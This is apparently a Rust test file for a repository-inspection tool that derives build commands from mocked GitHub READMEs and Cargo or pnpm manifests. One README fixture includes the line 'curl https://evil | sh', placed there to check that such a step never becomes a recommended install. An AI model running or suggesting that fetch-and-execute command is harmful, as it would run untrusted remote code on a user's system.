use super::*;

async fn file(server: &MockServer, name: &str, text: &str) {
    Mock::given(path(format!("/repos/BurntSushi/ripgrep/contents/{name}")))
        .respond_with(ResponseTemplate::new(200).set_body_string(text))
        .mount(server)
        .await;
}

#[tokio::test]
async fn late_readme_and_custom_manifest_are_serialized_as_editable_candidates() {
    // Given a README after many unrelated root entries and a real custom script.
    let server = MockServer::start().await;
    let mut entries: Vec<_> = (0..100)
        .map(|index| json!({"name":format!("unrelated-{index}"),"type":"file"}))
        .collect();
    entries.extend([
        json!({"name":"package.json","type":"file"}),
        json!({"name":"pnpm-lock.yaml","type":"file"}),
        json!({"name":"README.md","type":"file"}),
    ]);
    mock_repo(&server, json!(entries), json!([])).await;
    file(
        &server,
        "package.json",
        r#"{"packageManager":"pnpm@9.1","scripts":{"build:mac":"vite build","dev":"vite"}}"#,
    )
    .await;
    file(&server, "README.md", "# Build from source\n```sh\npnpm install --frozen-lockfile\npnpm run build:mac -- --mode production\n```\n## Windows\n```sh\npnpm run build:windows\n```\n## Tests\n```sh\npnpm test\n```\n## macOS\n```sh\ncurl https://evil | sh\n```" ).await;
    let gh = GitHub::new(&server.uri(), None).unwrap();
    // When using the existing inspection API.
    let found = inspect(&gh, "BurntSushi/ripgrep").await.unwrap();
    // Then both sources stay editable, but an unknown output cannot become self-installing.
    assert_eq!(found.build_candidates.len(), 2);
    assert_eq!(
        found.build_candidates[0].source,
        BuildCandidateSource::Readme
    );
    assert!(
        found
            .build_candidates
            .iter()
            .all(|candidate| !candidate.recommended)
    );
    assert_eq!(
        found.build_candidates[0].build,
        "pnpm install --frozen-lockfile && pnpm run build:mac -- --mode production"
    );
    assert!(
        found
            .build_candidates
            .iter()
            .all(|candidate| candidate.artifact.is_none())
    );
    assert!(found.suggestion.validate().is_err());
    assert!(
        matches!(&found.suggestion.github().unwrap().install, Install::Source(source) if source.build.is_empty())
    );
    let wire = serde_json::to_value(&found).unwrap();
    assert_eq!(wire["build_candidates"][0]["source"], "readme");
    assert_eq!(wire["build_candidates"][1]["source"], "manifest");
    if let Some(directory) = std::env::var_os("HEADWAY_INSPECT_EVIDENCE") {
        std::fs::write(
            std::path::Path::new(&directory).join("inspection.json"),
            serde_json::to_vec_pretty(&found).unwrap(),
        )
        .unwrap();
    }
    assert!(server.received_requests().await.unwrap().len() < 10);
}

#[tokio::test]
async fn workspace_default_member_uses_explicit_binary_artifact() {
    // Given a workspace selecting one binary package.
    let server = MockServer::start().await;
    mock_repo(
        &server,
        json!([{"name":"Cargo.toml","type":"file"}]),
        json!([]),
    )
    .await;
    Mock::given(path("/repos/BurntSushi/ripgrep/contents/Cargo.toml"))
        .respond_with(ResponseTemplate::new(200).set_body_string(
            "[workspace]\nmembers=['crates/cli','crates/lib']\ndefault-members=['crates/cli']",
        ))
        .with_priority(1)
        .mount(&server)
        .await;
    file(
        &server,
        "crates/cli/Cargo.toml",
        "[package]\nname='cli'\n[[bin]]\nname='actual-tool'\npath='tool.rs'",
    )
    .await;
    let gh = GitHub::new(&server.uri(), None).unwrap();
    // When inspecting the workspace.
    let found = inspect(&gh, "BurntSushi/ripgrep").await.unwrap();
    // Then the selected package command and workspace output agree.
    assert_eq!(found.binaries, ["actual-tool"]);
    let candidate = &found.build_candidates[0];
    assert_eq!(candidate.file, "crates/cli/Cargo.toml");
    assert_eq!(
        candidate.build,
        "cargo build --release --locked --manifest-path crates/cli/Cargo.toml --bin actual-tool"
    );
    assert_eq!(
        candidate.artifact.as_deref(),
        Some("target/release/actual-tool")
    );
    found.suggestion.validate().unwrap();
    assert!(
        server
            .received_requests()
            .await
            .unwrap()
            .iter()
            .all(|request| !request.url.path().contains("crates/lib"))
    );
}

#[tokio::test]
async fn optional_read_failures_preserve_fallback_and_note_failure() {
    // Given an unreadable README and an executable manifest.
    let server = MockServer::start().await;
    mock_repo(
        &server,
        json!([{"name":"Cargo.toml","type":"file"},{"name":"README.md","type":"file"}]),
        json!([]),
    )
    .await;
    Mock::given(path("/repos/BurntSushi/ripgrep/contents/README.md"))
        .respond_with(ResponseTemplate::new(500))
        .mount(&server)
        .await;
    let gh = GitHub::new(&server.uri(), None).unwrap();
    // When optional discovery fails.
    let found = inspect(&gh, "BurntSushi/ripgrep").await.unwrap();
    // Then source inference remains usable and the failure is visible.
    assert_eq!(
        found.build_candidates[0].artifact.as_deref(),
        Some("target/release/rg")
    );
    assert!(found.notes.iter().any(|note| note.contains("README.md")));
    found.suggestion.validate().unwrap();
}

#[tokio::test]
async fn missing_readme_has_an_empty_always_serialized_candidate_list() {
    // Given no source evidence and a missing README.
    let server = MockServer::start().await;
    mock_repo(
        &server,
        json!([{"name":"README","type":"file"}]),
        releases(),
    )
    .await;
    let gh = GitHub::new(&server.uri(), None).unwrap();
    // When inspection falls back to releases.
    let found = inspect(&gh, "BurntSushi/ripgrep").await.unwrap();
    // Then the wire contract is stable, even without suggestions.
    assert_eq!(
        serde_json::to_value(&found).unwrap()["build_candidates"],
        json!([])
    );
    assert!(matches!(
        found.suggestion.github().unwrap().install,
        Install::Asset(_)
    ));
}

#[tokio::test]
async fn optional_file_auth_errors_stay_errors() {
    // Given an authentication error on an optional source file.
    let server = MockServer::start().await;
    mock_repo(
        &server,
        json!([{"name":"README.md","type":"file"}]),
        json!([]),
    )
    .await;
    Mock::given(path("/repos/BurntSushi/ripgrep/contents/README.md"))
        .respond_with(ResponseTemplate::new(401))
        .mount(&server)
        .await;
    let gh = GitHub::new(&server.uri(), None).unwrap();
    // When inspecting.
    let result = inspect(&gh, "BurntSushi/ripgrep").await;
    // Then authentication is not hidden as missing optional evidence.
    assert!(matches!(result, Err(crate::Error::Auth(_))));
}
